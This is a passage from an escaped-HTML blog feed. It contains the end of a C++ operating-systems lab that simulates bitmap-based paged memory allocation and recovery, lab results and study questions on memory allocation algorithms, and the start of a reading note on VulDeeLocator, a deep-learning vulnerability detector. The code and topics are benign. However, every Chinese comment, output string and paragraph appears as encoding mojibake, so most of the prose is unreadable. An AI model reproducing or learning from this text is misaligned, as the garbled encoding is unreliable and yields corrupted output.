class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">0</span>][<span class="hljs-number">5</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">0</span>][<span class="hljs-number">6</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">1</span>][<span class="hljs-number">3</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">1</span>][<span class="hljs-number">5</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">3</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    table[<span class="hljs-number">3</span>][<span class="hljs-number">7</span>] = <span class="hljs-number">1</span>;<br>    free_num -= <span class="hljs-number">10</span>;<br>    work a;<br>    a.name = <span class="hljs-string">&quot;w1&quot;</span>;<span class="hljs-comment">//ä½œä¸š1</span><br>    a.mem_num = <span class="hljs-number">4</span>;<br>    a.page_table[<span class="hljs-number">0</span>] = <span class="hljs-number">4</span>;<br>    a.page_table[<span class="hljs-number">1</span>] = <span class="hljs-number">5</span>;<br>    a.page_table[<span class="hljs-number">2</span>] = <span class="hljs-number">6</span>;<br>    a.page_table[<span class="hljs-number">3</span>] = <span class="hljs-number">31</span>;<br>    w.<span class="hljs-built_in">push_back</span>(a);<br><br>    a.name = <span class="hljs-string">&quot;w2&quot;</span>;<span class="hljs-comment">//ä½œä¸š2</span><br>    a.mem_num = <span class="hljs-number">6</span>;<br>    a.page_table[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    a.page_table[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    a.page_table[<span class="hljs-number">2</span>] = <span class="hljs-number">9</span>;<br>    a.page_table[<span class="hljs-number">3</span>] = <span class="hljs-number">11</span>;<br>    a.page_table[<span class="hljs-number">4</span>] = <span class="hljs-number">13</span>;<br>    a.page_table[<span class="hljs-number">5</span>] = <span class="hljs-number">24</span>;<br>    w.<span class="hljs-built_in">push_back</span>(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆå§‹åŒ–å®Œæˆ\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span><span class="hljs-comment">//ä¿¡æ¯æ‰“å°å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å½“å‰ä½ç¤ºå›¾å’Œä½œä¸šé¡µè¡¨:\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|--------------ä½ç¤ºå›¾---------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  ä½æ•°  |&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3d&quot;</span>, i);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  |\n| å­—èŠ‚æ•° |%24c  |\n&quot;</span>, <span class="hljs-string">&#x27; &#x27;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|        ___________________________|\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;| %6d |&quot;</span>, i);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3d&quot;</span>, table[i][j]);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  |\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nå½“å‰ç©ºé—²å—æ•°ï¼š%d\n&quot;</span>, free_num);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|-----ä½œä¸šé¡µè¡¨----|\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; w.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------------|\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      ä½œä¸š%s     |\n&quot;</span>, w[i].name.<span class="hljs-built_in">c_str</span>());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  é¡µå·  |  å—å·  |\n&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; w[i].mem_num; j++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  %4d  |  %4d  |\n&quot;</span>, j, w[i].page_table[j]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------------|\n\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">allocation</span><span class="hljs-params">()</span><span class="hljs-comment">//ä½œä¸šåˆ†é…å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    work a;<br>    <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<span class="hljs-comment">//è¾“å…¥ä½œä¸šåå¹¶åˆ¤æ–­æ˜¯å¦å·²ç»å­˜åœ¨</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è¦åˆ†é…çš„ä½œä¸šå:&quot;</span>);<br>        cin &gt;&gt; a.name;<br>        <span class="hljs-keyword">int</span> kk = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; w.<span class="hljs-built_in">size</span>(); i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (a.name == w[i].name)<br>                kk = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (kk == <span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å½“å‰ä½œä¸šå·²å­˜åœ¨ï¼Œè¯·é‡æ–°è¾“å…¥\n&quot;</span>);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥ä½œä¸šå†…å­˜ç”³è¯·é‡:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a.mem_num);<br>    <span class="hljs-keyword">if</span> (free_num &gt;= a.mem_num)<span class="hljs-comment">//å¦‚æœå†…å­˜ç©ºé—´å¤§äºä½œä¸šå†…å­˜ç”³è¯·æ•°é‡</span><br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (!table[i][j])<span class="hljs-comment">//ä¿®æ”¹æœªåˆ†é…çš„ä½ç¤ºå›¾</span><br>                &#123;<br>                    table[i][j] = <span class="hljs-number">1</span>;<br>                    free_num--;<br>                    a.page_table[t++] = i * <span class="hljs-number">8</span> + j;<br>                    <span class="hljs-keyword">if</span> (t == a.mem_num)<br>                        <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (t == a.mem_num)<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>        w.<span class="hljs-built_in">push_back</span>(a);<span class="hljs-comment">//åŠ å…¥ä½œä¸šåˆ—è¡¨</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nä½œä¸šå†…å­˜åˆ†é…æˆåŠŸ\n&quot;</span>);<br>        <span class="hljs-built_in">print</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nå†…å­˜ç©ºé—²å—ä¸è¶³\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">recovery</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string name;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è¦é‡Šæ”¾çš„ä½œä¸šå:&quot;</span>);<br>    cin &gt;&gt; name;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; w.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (w[i].name == name)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nå½“å‰ä½œä¸šå½’è¿˜çš„å—å·ï¼š&quot;</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; w[i].mem_num; k++)<span class="hljs-comment">//é€ä¸ªé‡Šæ”¾å†…å­˜å—</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d  &quot;</span>, w[i].page_table[k]);<br>                table[w[i].page_table[k] / <span class="hljs-number">8</span>][w[i].page_table[k] % <span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>                free_num++;<br>            &#125;<br>            w.<span class="hljs-built_in">erase</span>(w.<span class="hljs-built_in">begin</span>() + i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nä½œä¸šå›æ”¶æˆåŠŸ\n&quot;</span>);<br>            <span class="hljs-built_in">print</span>();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\næœªæ‰¾åˆ°å½“å‰ä½œä¸š\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> q;<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-built_in">print</span>();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">menu</span>();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥é€‰æ‹©:&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;q);<br>        <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (q)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">allocation</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">recovery</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ-3"><a class="markdownIt-Anchor" href="#ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ-3"></a> ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ</h4><p>åˆå§‹çŠ¶æ€ï¼š</p><p><img src="/posts/6c024da0/image-20211214144921135.png" alt="image-20211214144921135"></p><p>åŠ å…¥å·¥ä½œ3ï¼Œç”³è¯·é‡ä¸º5ï¼š</p><p><img src="/posts/6c024da0/image-20211214145013435.png" alt="image-20211214145013435"></p><p><img src="/posts/6c024da0/image-20211214145032075.png" alt="image-20211214145032075"></p><p>å›æ”¶å·¥ä½œ1ï¼š</p><p><img src="/posts/6c024da0/image-20211214145333974.png" alt="image-20211214145333974"></p><p><img src="/posts/6c024da0/image-20211214145129469.png" alt="image-20211214145129469"></p><p>å…¨éƒ¨å›æ”¶ï¼š</p><p><img src="/posts/6c024da0/image-20211214145241609.png" alt="image-20211214145241609"></p><h4 id="æ€è€ƒé¢˜-3"><a class="markdownIt-Anchor" href="#æ€è€ƒé¢˜-3"></a> æ€è€ƒé¢˜</h4><p><strong>å„ç§ä¸»å­˜åˆ†é…ç®—æ³•çš„ä¼˜ç¼ºç‚¹</strong></p><ul><li><p>é¦–æ¬¡é€‚åº”ç®—æ³•ï¼š</p><ul><li><p>ä¼˜ç‚¹ï¼š è¯¥ç®—æ³•å€¾å‘äºä½¿ç”¨å†…å­˜ä¸­ä½åœ°å€éƒ¨åˆ†çš„ç©ºé—²åŒºï¼Œåœ¨é«˜åœ°å€éƒ¨åˆ†çš„ç©ºé—²åŒºå¾ˆå°‘è¢«åˆ©ç”¨ï¼Œä»è€Œä¿ç•™äº†é«˜åœ°å€éƒ¨åˆ†çš„å¤§ç©ºé—² åŒºã€‚æ˜¾ç„¶ä¸ºä»¥ååˆ°è¾¾çš„å¤§ä½œä¸šåˆ†é…å¤§çš„å†…å­˜ç©ºé—´åˆ›é€ äº†æ¡ä»¶</p></li><li><p>ç¼ºç‚¹ï¼šä½åœ°å€éƒ¨åˆ†ä¸æ–­è¢«åˆ’åˆ†ï¼Œç•™ä¸‹è®¸å¤šéš¾ä»¥åˆ©ç”¨ã€å¾ˆå°çš„ç©ºé—²åŒºï¼Œè€Œæ¯æ¬¡æŸ¥æ‰¾åˆéƒ½ä»ä½åœ°å€éƒ¨åˆ†å¼€å§‹ï¼Œä¼šå¢åŠ æŸ¥æ‰¾çš„å¼€é”€</p></li></ul></li><li><p>æœ€ä½³é€‚åº”ç®—æ³•ï¼š</p><ul><li><p>ä¼˜ç‚¹ï¼šæ¯æ¬¡åˆ†é…ç»™æ–‡ä»¶çš„éƒ½æ˜¯æœ€åˆé€‚è¯¥æ–‡ä»¶å¤§å°çš„åˆ†åŒºã€‚</p></li><li><p>ç¼ºç‚¹ï¼šå†…å­˜ä¸­ç•™ä¸‹è®¸å¤šéš¾ä»¥åˆ©ç”¨çš„å°çš„ç©ºé—²åŒºã€‚</p></li></ul></li><li><p>æœ€å·®é€‚åº”ç®—æ³•ï¼š</p><ul><li>ä¼˜ç‚¹ï¼šç»™æ–‡ä»¶åˆ†é…åˆ†åŒºåå‰©ä¸‹çš„ç©ºé—²åŒºä¸è‡³äºå¤ªå°ï¼Œäº§ç”Ÿç¢ç‰‡çš„å‡ ç‡æœ€å°ï¼Œå¯¹ä¸­å°å‹æ–‡ä»¶åˆ†é…åˆ†åŒºæ“ä½œæœ‰åˆ©ã€‚</li><li>ç¼ºç‚¹ï¼šä½¿å­˜å‚¨å™¨ä¸­ç¼ºä¹å¤§çš„ç©ºé—²åŒºï¼Œå¯¹å¤§å‹æ–‡ä»¶çš„åˆ†åŒºåˆ†é…ä¸åˆ©ã€‚</li></ul></li></ul><p><strong>å¦‚ä½•åˆ©ç”¨ç©ºé—²åˆ†åŒº</strong></p><p>é‡‡ç”¨å¯å˜å†…å­˜ç®¡ç†ï¼Œåˆå¹¶å°çš„ç©ºé—²åŒºã€‚</p><h3 id="äº”-å®éªŒæ€»ç»“-2"><a class="markdownIt-Anchor" href="#äº”-å®éªŒæ€»ç»“-2"></a> äº”ã€å®éªŒæ€»ç»“</h3><p>æœ¬æ¬¡å®éªŒè¦æˆ‘å¯¹ä¸åŒçš„å­˜å‚¨ç®¡ç†æ–¹å¼ä¸‹åº”æ€æ ·å®ç°ä¸»å­˜ç©ºé—´çš„åˆ†é…å’Œå›æ”¶æœ‰äº†æ›´æ·±çš„ç†è§£ï¼Œå¯¹é¡µé¢ç½®æ¢ç®—æ³•ã€ä¸»å­˜åˆ†é…å›æ”¶ç®—æ³•ã€æœ€å…ˆé€‚åº”ç®—æ³•å’Œä½ç¤ºå›¾æ–¹æ³•æœ‰äº†ä¸€å®šçš„äº†è§£ï¼Œå®éªŒç®—æ³•æ€è·¯æ€»ä½“ä¸Šè¾ƒä¸ºç®€å•ï¼Œåªè¦ç†è§£äº†å…·ä½“çš„å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾è§„åˆ™å°±æ¯”è¾ƒå®¹æ˜“å†™å‡ºç®—æ³•ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ“ä½œç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®ºæ–‡ç¬”è®°:ã€ŠVulDeeLocator:A Deep Learning-based Fine-grained Vulnerability Detectorã€‹</title>
    <link href="/posts/33f70302/"/>
    <url>/posts/33f70302/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€-vuldeellocatoråŸºæœ¬æ€æƒ³"><a class="markdownIt-Anchor" href="#ä¸€-vuldeellocatoråŸºæœ¬æ€æƒ³"></a> ä¸€ã€VulDeelLocatoråŸºæœ¬æ€æƒ³</h1><p>VulDeeLocatorçš„<strong>åŸºæœ¬æ€æƒ³</strong>æ˜¯å……åˆ†åˆ©ç”¨<strong>ç¨‹åºåˆ†æ</strong>å’Œ<strong>æ·±åº¦å­¦ä¹ </strong>æŠ€æœ¯:</p><ul><li>é€šè¿‡åˆ©ç”¨ç¨‹åºåˆ†ææŠ€æœ¯ç”Ÿæˆæ¼æ´å€™é€‰ï¼Œ</li><li>å¹¶ä½¿ç”¨æ·±åº¦å­¦ä¹ æŠ€æœ¯â€œæ¶ˆé™¤â€ç¨‹åºåˆ†ææŠ€æœ¯äº§ç”Ÿçš„è¯¯æŠ¥ã€‚</li></ul><p>å…·ä½“æ¥è¯´ï¼Œ</p><ul><li>VulDeeLocatoræ ¹æ®ä¸€ç»„ç»™å®šçš„æ¼æ´è¯­æ³•ç‰¹å¾ï¼Œä»ç¨‹åºæºä»£ç ä¸­æå–ä¸€äº›æ ‡è®°(ä¾‹å¦‚ï¼Œæ ‡è¯†ç¬¦ã€æ“ä½œç¬¦ã€å¸¸é‡å’Œå…³é”®å­—)ï¼Œ</li><li>ç„¶ååˆ©ç”¨åŒä¸€ç¨‹åºçš„ä¸­é—´ä»£ç æ¥å®¹çº³ä¸­é—´ä»£ç ä¸­åœ¨è¯­ä¹‰ä¸Šä¸è¿™äº›æ ‡è®°ç›¸å…³çš„è¯­å¥ã€‚</li><li>è¿™äº›è¯­å¥è¢«ç¼–ç æˆå‘é‡(ç„¶åç”¨äºè®­ç»ƒç¥ç»ç½‘ç»œ)ï¼Œæˆ–è€…ä½œä¸ºè®­ç»ƒåçš„ç¥ç»ç½‘ç»œçš„è¾“å…¥ï¼Œç”¨äºæ¼æ´æ£€æµ‹ã€‚</li><li>æµ‹è¯•é˜¶æ®µçš„è¾“å‡ºæ¯”ç›¸åº”çš„è¾“å…¥ç²’åº¦æ›´ç»†(ä¾‹å¦‚ï¼Œæ›´çŸ­æˆ–æ›´å°)ã€‚</li></ul><p>å›¾1è¯´æ˜äº†è¿™äº›åŸºæœ¬æ€æƒ³ï¼Œæ˜¾ç¤ºäº†åœ¨æµ‹è¯•é˜¶æ®µï¼Œdâ€™ä¸­é—´ä»£ç è¯­å¥çš„è¾“å…¥ä¼šå¯¼è‡´ä¸¤ä¸ªæºä»£ç è¯­å¥çš„ç²¾ç‚¼è¾“å‡ºï¼Œè¡¨æ˜æ¼æ´åœ¨å“ªé‡Œã€‚</p><p><img src="/posts/33f70302/image-20211215140844637.png" alt="image-20211215140844637"></p><h1 id="äºŒ-æ¦‚è¿°"><a class="markdownIt-Anchor" href="#äºŒ-æ¦‚è¿°"></a> äºŒã€æ¦‚è¿°</h1><p>æ¼æ´å¾ˆç›´è§‚åœ°å±•ç¤ºäº†ä¸€äº›è¯­æ³•ç‰¹å¾ï¼Œå¯ä»¥åˆ©ç”¨è¿™äº›ç‰¹å¾æ¥è¯†åˆ«ä¸€äº›ä»£ç ç‰‡æ®µ(å³ç¨‹åºåˆ‡ç‰‡)ä½œä¸ºæ¼æ´æ£€æµ‹çš„åˆå§‹å€™é€‰é¡¹ã€‚</p><h2 id="21-åŸºç¡€å®šä¹‰"><a class="markdownIt-Anchor" href="#21-åŸºç¡€å®šä¹‰"></a> 2.1 åŸºç¡€å®šä¹‰</h2><ul><li><p><strong>å®šä¹‰ä¸€ï¼š</strong><code>sSyVC</code>(source code- and Syntax-based Vulnerability Candidate)ï¼š<strong>åŸºäºæºä»£ç å’Œè¯­æ³•çš„æ¼æ´å€™é€‰</strong></p><p>ç»™å®šä¸€ä¸ªæºç¨‹åºPå’Œä¸€ç»„æ¼æ´è¯­æ³•ç‰¹å¾H= {h1ï¼Œâ€¦ï¼Œ hÎ·}ï¼Œä¸€ä¸ª<code>sSyVC</code> y<sub>i</sub>æ˜¯Pä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªè¿ç»­ç¬¦å·(ä¾‹å¦‚ï¼Œæ ‡è¯†ç¬¦ã€æ“ä½œç¬¦ã€å¸¸é‡å’Œå…³é”®å­—)ï¼Œå®ƒä»¬åŒ¹é…æŸäº›æ¼æ´è¯­æ³•ç‰¹å¾hq(1â‰¤ qâ‰¤Î·).</p></li><li><p><strong>å®šä¹‰äºŒï¼š</strong><code>iSeVC</code> (intermediate code- and Semantics-based Vulnerability Candidate)ï¼š<strong>åŸºäºä¸­é—´ä»£ç å’Œè¯­ä¹‰çš„æ¼æ´å€™é€‰</strong></p><p>ç»™å®šä¸€ä¸ªæºç¨‹åºPï¼Œå®ƒçš„ä¸­é—´ä»£ç æ˜¯Pâ€™ï¼Œå’ŒPçš„ä¸€ä¸ª<code>sSyVC</code>  y<sub>i</sub>ï¼Œç”¨y<sub>i</sub>â€™è¡¨ç¤º<code>sSyVC</code> y<sub>i</sub>çš„ä¸­é—´ä»£ç ã€‚ä¸sSyVC  yiå¯¹åº”çš„iSeVCï¼Œç”¨eiè¡¨ç¤ºï¼Œæ˜¯ä¸­é—´ä»£ç Pâ€˜ä¸­çš„è¯­å¥åºåˆ—;è¿™äº›è¯­å¥æ˜¯ä¾èµ–äºy<sub>i</sub>â€™çš„æ•°æ®æˆ–æ§åˆ¶ã€‚</p><p>å³<code>sSyVC</code>  yiå¯¹åº”çš„<code>iSeVC</code>æ˜¯ç¨‹åºPä¸­é—´ä»£ç ä¸­çš„y<sub>i</sub>â€˜çš„ç¨‹åºåˆ‡ç‰‡ã€‚</p></li></ul><h2 id="22-vuldeelocatorç»“æ„"><a class="markdownIt-Anchor" href="#22-vuldeelocatorç»“æ„"></a> 2.2 VulDeeLocatorç»“æ„</h2><p><img src="/posts/33f70302/image-20211215145019213.png" alt="VulDeeLocatorç»“æ„å›¾"></p><p>ä¸Šå›¾æ˜¾ç¤ºäº†<strong>VulDeeLocatorçš„ç»“æ„</strong>ï¼Œå®ƒå¯ä»¥ç”¨ç‰¹å®šçš„ä¸­é—´ä»£ç è¡¨ç¤ºå’Œæ·±åº¦å­¦ä¹ æ¨¡å‹æ¥å®Œæˆå®ä¾‹åŒ–ã€‚</p><p>VulDeeLocatorçš„<strong>è¾“å…¥</strong>æ˜¯ç”¨äºå­¦ä¹ ç¥ç»ç½‘ç»œçš„åŸ¹è®­ç¨‹åºçš„æºä»£ç æˆ–ç”¨äºæ¼æ´æ£€æµ‹çš„ç›®æ ‡ç¨‹åºã€‚</p><ul><li><p>æ›´å…·ä½“åœ°è¯´ï¼Œå­¦ä¹ é˜¶æ®µçš„è¾“å…¥åŒ…æ‹¬Cç¨‹åºçš„æºä»£ç ï¼Œè¿™äº›æºä»£ç å¯èƒ½æœ‰æ¼æ´ï¼Œä¹Ÿå¯èƒ½æ²¡æœ‰ã€‚</p></li><li><p>Cç¨‹åºçš„æºä»£ç åº”æ»¡è¶³ä»¥ä¸‹æ¡ä»¶:</p><ul><li><p>(i)å®ƒä»¬å¯ä»¥ç¼–è¯‘æˆ(å¹³å°æ— å…³çš„)ä¸­é—´ä»£ç ï¼Œå¦‚LLVMä¸­é—´ä»£ç ;</p></li><li><p>(ii)æ¼æ´ç¨‹åºå…·æœ‰å¯¹å…¶æ¼æ´ä½ç½®çš„æè¿°ï¼Œè¿™äº›æè¿°å°†è¢«ç”¨æ¥å®šä½ç›®æ ‡ç¨‹åºä¸­çš„æ¼æ´ã€‚</p></li></ul></li></ul><p>VulDeeLocatoræœ‰<strong>ä¸¤ä¸ªç»„ä»¶</strong>ã€‚</p><ul><li>ç¬¬ä¸€ä¸ªç»„ä»¶(<strong>åŸºäºä¸­é—´ä»£ç çš„æ¼æ´å€™é€‰è¡¨ç¤º</strong>)åˆ©ç”¨è®­ç»ƒç¨‹åºå’Œç›®æ ‡ç¨‹åºçš„ä¸­é—´ä»£ç è¡¨ç¤ºï¼Œå¦‚ä¸‹æ‰€ç¤º:<ul><li><strong>æ­¥éª¤I:</strong> ä»æºä»£ç ä¸­æå–<code>sSyVCs</code>ï¼Œå³å¸¦æœ‰ä¸€äº›æ¼æ´è¯­æ³•ç‰¹å¾çš„ä»£ç ç‰‡æ®µã€‚</li><li><strong>æ­¥éª¤II:</strong> æ ¹æ®<code>sSyVCs</code>ä»ä¸­é—´ä»£ç ç”Ÿæˆ<code>iSeVCs</code>ã€‚</li></ul></li><li>ç¬¬äºŒä¸ªç»„ä»¶(<strong>ç»†ç²’åº¦çš„æ¼æ´æ£€æµ‹</strong>)ä½¿ç”¨ä¸­é—´ä»£ç è¡¨ç¤ºæ¥æ£€æµ‹å’Œå®šä½æ¼æ´ï¼Œ å¦‚ä¸‹æ‰€ç¤º:<ul><li><strong>æ­¥éª¤III:</strong> æ ‡è®°ä»è®­ç»ƒé¡¹ç›®ä¸­æå–çš„<code>iSeVCs</code>æ˜¯å¦å­˜åœ¨æ¼æ´å’Œå­˜åœ¨æ¼æ´çš„ä½ç½®ã€‚</li><li>**æ­¥éª¤IV: **ä»<code>iSeVCs</code>åŠå…¶æ ‡ç­¾çš„å‘é‡è¡¨ç¤ºè®­ç»ƒä¸€ä¸ªç¥ç»ç½‘ç»œæ¨¡å‹ã€‚</li><li><strong>æ­¥éª¤V:</strong> ä½¿ç”¨ç»è¿‡è®­ç»ƒçš„ç¥ç»ç½‘ç»œæ¨¡å‹æ£€æµ‹å’Œå®šä½ç›®æ ‡ç¨‹åºä¸­çš„æ¼æ´ã€‚</li></ul></li></ul><p>å­¦ä¹ é˜¶æ®µå¯¹åº”æ­¥éª¤I-IVï¼Œæµ‹è¯•(å³æ£€æµ‹)é˜¶æ®µå¯¹åº”æ­¥éª¤Iã€IIå’ŒV</p><h1 id="ä¸‰-åŸºäºä¸­é—´ä»£ç çš„æ¼æ´å€™é€‰è¡¨ç¤º"><a class="markdownIt-Anchor" href="#ä¸‰-åŸºäºä¸­é—´ä»£ç çš„æ¼æ´å€™é€‰è¡¨ç¤º"></a> ä¸‰ã€åŸºäºä¸­é—´ä»£ç çš„æ¼æ´å€™é€‰è¡¨ç¤º</h1><h2 id="31-æ¼æ´å€™é€‰è¡¨ç¤ºçš„æŒ‡å¯¼åŸåˆ™"><a class="markdownIt-Anchor" href="#31-æ¼æ´å€™é€‰è¡¨ç¤ºçš„æŒ‡å¯¼åŸåˆ™"></a> 3.1 